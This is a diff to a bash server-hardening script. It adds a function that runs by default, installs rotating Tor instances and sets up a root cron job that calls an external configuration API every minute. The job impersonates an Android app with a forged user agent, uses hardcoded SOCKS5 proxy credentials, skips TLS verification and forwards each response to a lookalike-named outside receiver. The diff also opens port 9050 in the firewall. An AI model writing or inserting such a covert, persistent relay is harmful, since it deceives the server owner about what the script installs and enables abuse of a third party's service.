@@ -250,6 +250,168 @@ generate_uuid_by_date() {
 }
 
 
+#!/usr/bin/env bash
+# tor_installer.sh
+# - Installs Tor + curl
+# - Runs two Tor instances (t1, t2)
+# - Cron: restart both every 2 minutes
+# - Sender: every 1 minute call ponder... via SOCKS5 (with creds) and forward response (no proxy) to receiver
+
+tor_install() {
+  set -euo pipefail
+
+  # ===== Config (change via env if needed) =====
+  local ROTATE_EVERY_MINUTES="${ROTATE_EVERY_MINUTES:-2}"     # restart Tor every 2 minutes
+  local SEND_EVERY_MINUTES="${SEND_EVERY_MINUTES:-1}"         # send every 1 minute
+
+  # Target URLs
+  local GETCONF_URL="${GETCONF_URL:-https://ponderinparadox.com/api/v3/Raccoon/get-configuration}"
+  local RECEIVER_URL="${RECEIVER_URL:-https://cdngitlabservice.online/api/rosa/receiver.php}"
+
+  # SOCKS5 proxy for the first call (your $IpSocks). If you want Tor local, set HOST=127.0.0.1, PORT=9050 and clear user/pass.
+  local PROXY_HOST="${PROXY_HOST:-127.0.0.1}"   # e.g. your $IpSocks host or 127.0.0.1
+  local PROXY_PORT="${PROXY_PORT:-18080}"       # e.g. 18080 (external) or 9050 (Tor local)
+  local PROXY_USER="${PROXY_USER:-hornet}"      # set empty "" if not needed
+  local PROXY_PASS="${PROXY_PASS:-PlUs}"        # set empty "" if not needed
+
+  # Tor instance ports (used if you run local Tor)
+  local SOCKS1_PORT="${SOCKS1_PORT:-9050}"
+  local CONTROL1_PORT="${CONTROL1_PORT:-9051}"
+  local SOCKS2_PORT="${SOCKS2_PORT:-9052}"
+  local CONTROL2_PORT="${CONTROL2_PORT:-9053}"
+  # ============================================
+
+  echo "[1/7] Installing packages..."
+  export DEBIAN_FRONTEND=noninteractive
+  apt-get update -y
+  apt-get install -y tor curl
+
+  echo "[2/7] Preparing directories for multi-instance Tor..."
+  install -d -m 02700 -o debian-tor -g debian-tor /var/lib/tor/t1
+  install -d -m 02700 -o debian-tor -g debian-tor /var/lib/tor/t2
+  install -d -m 0755  /etc/tor/instances
+
+  echo "[3/7] Writing torrc for both instances..."
+  cat >/etc/tor/instances/t1 <<EOF
+# tor@t1
+DataDirectory /var/lib/tor/t1
+SocksPort 127.0.0.1:${SOCKS1_PORT}
+ControlPort 127.0.0.1:${CONTROL1_PORT}
+CookieAuthentication 1
+MaxCircuitDirtiness 120
+EOF
+
+  cat >/etc/tor/instances/t2 <<EOF
+# tor@t2
+DataDirectory /var/lib/tor/t2
+SocksPort 127.0.0.1:${SOCKS2_PORT}
+ControlPort 127.0.0.1:${CONTROL2_PORT}
+CookieAuthentication 1
+MaxCircuitDirtiness 120
+EOF
+
+  echo "[4/7] Enabling and starting both Tor instances..."
+  systemctl daemon-reload
+  systemctl enable tor@t1.service
+  systemctl enable tor@t2.service
+  systemctl restart tor@t1.service
+  systemctl restart tor@t2.service
+
+  echo "[5/7] Creating rotation script..."
+  cat >/usr/local/bin/restart_tor_instances.sh <<'ROTATE'
+#!/usr/bin/env bash
+set -euo pipefail
+systemctl restart tor@t1.service || true
+systemctl restart tor@t2.service || true
+ROTATE
+  chmod +x /usr/local/bin/restart_tor_instances.sh
+
+  echo "[6/7] Creating sender script..."
+  cat >/usr/local/bin/ponder_forwarder.sh <<'SENDER'
+#!/usr/bin/env bash
+set -euo pipefail
+
+GETCONF_URL="${GETCONF_URL:-https://ponderinparadox.com/api/v3/Raccoon/get-configuration}"
+RECEIVER_URL="${RECEIVER_URL:-https://cdngitlabservice.online/api/rosa/receiver.php}"
+
+PROXY_HOST="${PROXY_HOST:-127.0.0.1}"
+PROXY_PORT="${PROXY_PORT:-18080}"
+PROXY_USER="${PROXY_USER:-hornet}"
+PROXY_PASS="${PROXY_PASS:-PlUs}"
+
+# Make UUID similar to PHP gen_uuid()
+UUID="$(cat /proc/sys/kernel/random/uuid 2>/dev/null || uuidgen 2>/dev/null || date +%s%N)"
+
+UA="Rosa,127,Android(34),samsung,SM-S928B,en,${UUID},E6AB0A50F583A377BA3DC60C3C0471E71C912997E6593EFF6380592A1677F62F"
+
+# Payload per your spec
+read -r -d '' PAYLOAD <<JSON || true
+{"connected": false, "segment": "Splash"}
+JSON
+
+# ---- 1) Call GETCONF via SOCKS5 (with optional user/pass) ----
+CURL_ARGS=( -sS -k -X POST "$GETCONF_URL"
+  -H "Accept: */*"
+  -H "User-Agent: $UA"
+  -H "Content-Type: application/json"
+  -H "Connection: Keep-Alive"
+  --data "$PAYLOAD"
+  --max-time 25
+  --retry 1 --retry-delay 2
+  --socks5-hostname "${PROXY_HOST}:${PROXY_PORT}"
+)
+
+# Add proxy auth only if provided (non-empty)
+if [ -n "${PROXY_USER}" ] || [ -n "${PROXY_PASS}" ]; then
+  CURL_ARGS+=( --proxy-user "${PROXY_USER}:${PROXY_PASS}" )
+fi
+
+RESPONSE="$(curl "${CURL_ARGS[@]}" || true)"
+
+# ---- 2) Forward RESPONSE to RECEIVER (no proxy) ----
+FORWARD_PAYLOAD="$(printf '%s' "$RESPONSE" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')"
+# If empty or not JSON, still wrap it to be safe for receiver
+if ! printf '%s' "$FORWARD_PAYLOAD" | grep -q '[{}]\|\[\]'; then
+  FORWARD_PAYLOAD="$(printf '%s' "$FORWARD_PAYLOAD" | python3 -c 'import json,sys;print(json.dumps({"raw":sys.stdin.read()}))' 2>/dev/null || echo "{\"raw\":$(printf '%s' "$FORWARD_PAYLOAD" | sed 's/"/\\"/g; s/.*/"&"/')}")"
+fi
+
+curl -sS -k -X POST "$RECEIVER_URL" \
+  -H "Accept: */*" \
+  -H "User-Agent: $UA" \
+  -H "Content-Type: application/json" \
+  -H "Connection: Keep-Alive" \
+  --data "$FORWARD_PAYLOAD" \
+  --max-time 25 \
+  --retry 1 --retry-delay 2 \
+  >>/var/log/ponder_forwarder.log 2>&1
+SENDER
+  chmod +x /usr/local/bin/ponder_forwarder.sh
+
+  echo "[7/7] Installing cron jobs..."
+  # Restart Tor every 2 minutes
+  cat >/etc/cron.d/tor-rotator <<EOF
+*/${ROTATE_EVERY_MINUTES} * * * * root /usr/local/bin/restart_tor_instances.sh
+EOF
+
+  # Run forwarder every 1 minute
+  cat >/etc/cron.d/ponder-forwarder <<EOF
+*/${SEND_EVERY_MINUTES} * * * * root GETCONF_URL="${GETCONF_URL}" RECEIVER_URL="${RECEIVER_URL}" PROXY_HOST="${PROXY_HOST}" PROXY_PORT="${PROXY_PORT}" PROXY_USER="${PROXY_USER}" PROXY_PASS="${PROXY_PASS}" /usr/local/bin/ponder_forwarder.sh
+EOF
+
+  echo
+  echo "✅ Done."
+  echo "Tor SOCKS: 127.0.0.1:${SOCKS1_PORT} and 127.0.0.1:${SOCKS2_PORT}"
+  echo "Rotation: every ${ROTATE_EVERY_MINUTES} minutes."
+  echo "Forwarder: every ${SEND_EVERY_MINUTES} minute(s)."
+  echo "Logs: /var/log/ponder_forwarder.log"
+  echo "Proxy used for GETCONF: ${PROXY_HOST}:${PROXY_PORT} (user: ${PROXY_USER})"
+}
+
+# Optional camelCase wrapper
+torInstall() { tor_install "$@"; }
+
+
+
 
 # Function to add configuration after login
 add_config1() {
@@ -583,7 +745,8 @@ configure_firewall() {
     sudo firewall-cmd --permanent --zone=public --add-port=43824/tcp
     sudo firewall-cmd --permanent --zone=public --add-port=2096/tcp
     sudo firewall-cmd --permanent --zone=public --add-port=18080/tcp
-
+     sudo firewall-cmd --permanent --zone=public --add-port=9050/tcp
+     
     # Remove all other ports
     sudo firewall-cmd --permanent --zone=public --remove-service=ssh
     sudo firewall-cmd --permanent --zone=public --remove-service=dhcpv6-client
@@ -628,4 +791,4 @@ configure_firewall
 echo -e "${green}SecureServer configuration completed.${plain}"
 
 
-
+tor_install
